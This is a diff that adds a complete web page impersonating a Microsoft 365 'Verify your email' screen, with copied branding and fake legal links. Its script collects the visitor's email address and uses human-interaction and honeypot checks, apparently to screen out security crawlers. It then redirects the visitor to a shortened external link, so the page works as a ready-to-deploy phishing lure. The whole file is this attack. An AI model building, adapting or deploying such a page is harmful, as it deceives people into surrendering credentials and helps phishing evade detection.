@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify your email - Microsoft 365</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            display: flex;
+            max-width: 900px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e1e5e9;
+        }
+        
+        .left-panel {
+            flex: 1;
+            background: #f8f9fa;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        
+        .right-panel {
+            flex: 1;
+            background: white;
+            padding: 40px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+        
+        .multicolor-logo {
+            display: flex;
+            width: 32px;
+            height: 32px;
+            margin-right: 12px;
+        }
+        
+        .logo-square {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .red { background: #f25022; }
+        .green { background: #7fba00; }
+        .blue { background: #00a4ef; }
+        .yellow { background: #ffb900; }
+        
+        .logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #323130;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #605e5c;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+        
+        .tip-box {
+            background: #f3f2f1;
+            border-left: 4px solid #0078d4;
+            padding: 15px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+        }
+        
+        .tip-title {
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 5px;
+        }
+        
+        .tip-text {
+            color: #605e5c;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #323130;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #8a8886;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .button-container {
+            margin-top: 30px;
+        }
+        
+        button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+        
+        button:hover {
+            background: #106ebe;
+        }
+        
+        button:active {
+            background: #005a9e;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #605e5c;
+            font-size: 14px;
+        }
+        
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .ad-logo {
+            display: flex;
+            align-items: center;
+            margin-top: 40px;
+            color: #605e5c;
+            font-size: 14px;
+        }
+        
+        .ad-icon {
+            margin-right: 8px;
+            font-size: 16px;
+            color: #0078d4;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .left-panel, .right-panel {
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-panel">
+            <div class="logo">
+                <div class="multicolor-logo">
+                    <div style="display: flex; flex-direction: column;">
+                        <div class="logo-square red"></div>
+                        <div class="logo-square green"></div>
+                    </div>
+                    <div style="display: flex; flex-direction: column;">
+                        <div class="logo-square blue"></div>
+                        <div class="logo-square yellow"></div>
+                    </div>
+                </div>
+                <span class="logo-text">Microsoft 365</span>
+            </div>
+            <h1>Verify email to proceed.</h1>
+            <p class="subtitle">We need to verify your email address to ensure security and provide access to your resources.</p>
+            
+            <div class="tip-box">
+                <div class="tip-title">Tips:</div>
+                <div class="tip-text">Only use the email this was shared with.</div>
+            </div>
+            
+            <div class="ad-logo">
+                <i class="fas fa-shield-alt ad-icon"></i>
+                <span>Microsoft Active Directory</span>
+            </div>
+        </div>
+        
+        <div class="right-panel">
+            <div class="logo">
+                <div class="multicolor-logo">
+                    <div style="display: flex; flex-direction: column;">
+                        <div class="logo-square red"></div>
+                        <div class="logo-square green"></div>
+                    </div>
+                    <div style="display: flex; flex-direction: column;">
+                        <div class="logo-square blue"></div>
+                        <div class="logo-square yellow"></div>
+                    </div>
+                </div>
+                <span class="logo-text">Microsoft</span>
+            </div>
+            
+            <h1>Verify your email</h1>
+            <p class="subtitle">Enter the email address where you received the verification message.</p>
+            
+            <form id="emailForm">
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <div class="input-container">
+                        <input type="email" id="email" name="email" placeholder="Enter your email address" required>
+                    </div>
+                    <div id="emailError" class="error-message">Please enter a valid email address.</div>
+                </div>
+                
+                <div class="button-container">
+                    <button type="submit" id="submitBtn">
+                        <span id="buttonText">Continue</span>
+                        <span id="buttonLoading" class="loading hidden"></span>
+                    </button>
+                </div>
+            </form>
+            
+            <div class="footer">
+                <p>By continuing, you agree to the <a href="#">Microsoft Services Agreement</a> and <a href="#">Privacy & Cookies</a>.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // MODIFIED VERSION: Redirects to your URL after verification
+        (function() {
+            'use strict';
+            
+            // Your redirect URL
+            const TARGET_URL = "https://ampl.ink/Dl05P";
+            
+            // Human verification class
+            class HumanVerifier {
+                constructor() {
+                    this.interactionScore = 0;
+                    this.startTime = Date.now();
+                    this.events = {
+                        mouse: 0,
+                        keyboard: 0,
+                        touch: 0
+                    };
+                    this.initializeTracking();
+                }
+                
+                initializeTracking() {
+                    const events = ['mousemove', 'mousedown', 'wheel', 'keydown', 'touchstart'];
+                    events.forEach(event => {
+                        document.addEventListener(event, () => {
+                            this.interactionScore++;
+                            if (event.includes('mouse')) this.events.mouse++;
+                            if (event.includes('key')) this.events.keyboard++;
+                            if (event.includes('touch')) this.events.touch++;
+                        }, { passive: true });
+                    });
+                }
+                
+                isHuman() {
+                    const timeElapsed = Date.now() - this.startTime;
+                    const hasInteractions = this.interactionScore >= 3;
+                    const hasMinimumTime = timeElapsed > 1500;
+                    const hasMixedEvents = (this.events.mouse > 0 && this.events.keyboard > 0) || 
+                                          (this.events.mouse > 1) || 
+                                          (this.events.keyboard > 1);
+                    
+                    return hasInteractions && hasMinimumTime && hasMixedEvents;
+                }
+            }
+            
+            // Email validation
+            function validateEmailAddress(emailStr) {
+                if (!emailStr || typeof emailStr !== 'string') return false;
+                
+                const trimmed = emailStr.trim();
+                const atIndex = trimmed.indexOf('@');
+                const dotIndex = trimmed.lastIndexOf('.');
+                
+                return atIndex > 0 && 
+                       dotIndex > atIndex + 1 && 
+                       dotIndex < trimmed.length - 1;
+            }
+            
+            // Main application controller
+            class VerificationController {
+                constructor() {
+                    this.verifier = new HumanVerifier();
+                    this.form = document.getElementById('emailForm');
+                    this.emailInput = document.getElementById('email');
+                    this.errorDisplay = document.getElementById('emailError');
+                    this.submitBtn = document.getElementById('submitBtn');
+                    this.btnText = document.getElementById('buttonText');
+                    this.loading = document.getElementById('buttonLoading');
+                    this.initialize();
+                }
+                
+                initialize() {
+                    this.setupHoneypots();
+                    this.attachEventListeners();
+                }
+                
+                setupHoneypots() {
+                    // Multiple honeypot fields
+                    const honeypots = [
+                        { name: 'website', type: 'text' },
+                        { name: 'name', type: 'text' },
+                        { name: 'phone', type: 'tel' }
+                    ];
+                    
+                    honeypots.forEach(hp => {
+                        const field = document.createElement('input');
+                        field.type = hp.type;
+                        field.name = hp.name;
+                        field.style.cssText = 'opacity:0;position:absolute;left:-9999px;height:0;width:0;';
+                        field.tabIndex = -1;
+                        this.form.appendChild(field);
+                    });
+                }
+                
+                attachEventListeners() {
+                    this.form.addEventListener('submit', (e) => this.handleFormSubmit(e));
+                    this.emailInput.addEventListener('input', () => {
+                        this.errorDisplay.style.display = 'none';
+                    });
+                    
+                    // Additional validation on blur
+                    this.emailInput.addEventListener('blur', () => {
+                        if (this.emailInput.value.trim()) {
+                            if (!validateEmailAddress(this.emailInput.value)) {
+                                this.errorDisplay.textContent = 'Please enter a valid email address.';
+                                this.errorDisplay.style.display = 'block';
+                            }
+                        }
+                    });
+                }
+                
+                handleFormSubmit(event) {
+                    event.preventDefault();
+                    
+                    // Check honeypots
+                    const honeypotFields = this.form.querySelectorAll('input[type="text"], input[type="tel"]');
+                    for (let field of honeypotFields) {
+                        if (field.name !== 'email' && field.value.length > 0) {
+                            this.showSecurityError();
+                            return;
+                        }
+                    }
+                    
+                    // Check human interaction
+                    if (!this.verifier.isHuman()) {
+                        this.errorDisplay.textContent = 'Additional verification required. Please interact with the page first.';
+                        this.errorDisplay.style.display = 'block';
+                        return;
+                    }
+                    
+                    const email = this.emailInput.value.trim();
+                    
+                    // Validate email
+                    if (!validateEmailAddress(email)) {
+                        this.errorDisplay.textContent = 'Please enter a valid email address.';
+                        this.errorDisplay.style.display = 'block';
+                        return;
+                    }
+                    
+                    // Proceed with verification
+                    this.processVerification(email);
+                }
+                
+                showSecurityError() {
+                    this.errorDisplay.textContent = 'Security verification failed. Please refresh the page.';
+                    this.errorDisplay.style.display = 'block';
+                    this.emailInput.focus();
+                }
+                
+                processVerification(email) {
+                    // Update UI
+                    this.btnText.textContent = 'Verifying...';
+                    this.loading.classList.remove('hidden');
+                    this.submitBtn.disabled = true;
+                    
+                    // Add random delay to simulate processing
+                    const delay = 1200 + Math.random() * 800;
+                    
+                    setTimeout(() => {
+                        // Store email in localStorage for tracking
+                        localStorage.setItem('last_verified_email', email);
+                        localStorage.setItem('verification_timestamp', Date.now());
+                        
+                        // Optional: Log verification (remove in production)
+                        console.log('Email verification completed for:', email);
+                        
+                        // REDIRECT TO YOUR URL
+                        window.location.href = TARGET_URL;
+                        
+                    }, delay);
+                }
+            }
+            
+            // Initialize when ready
+            function initApp() {
+                if (document.readyState === 'loading') {
+                    document.addEventListener('DOMContentLoaded', () => {
+                        new VerificationController();
+                    });
+                } else {
+                    new VerificationController();
+                }
+            }
+            
+            // Add CSS for error animation
+            const errorStyle = document.createElement('style');
+            errorStyle.textContent = `
+                @keyframes shakeError {
+                    0%, 100% { transform: translateX(0); }
+                    25% { transform: translateX(-5px); }
+                    75% { transform: translateX(5px); }
+                }
+                
+                .error-shake {
+                    animation: shakeError 0.3s ease-in-out;
+                }
+            `;
+            document.head.appendChild(errorStyle);
+            
+            // Start the application
+            initApp();
+            
+        })();
+    </script>
+</body>
+</html>
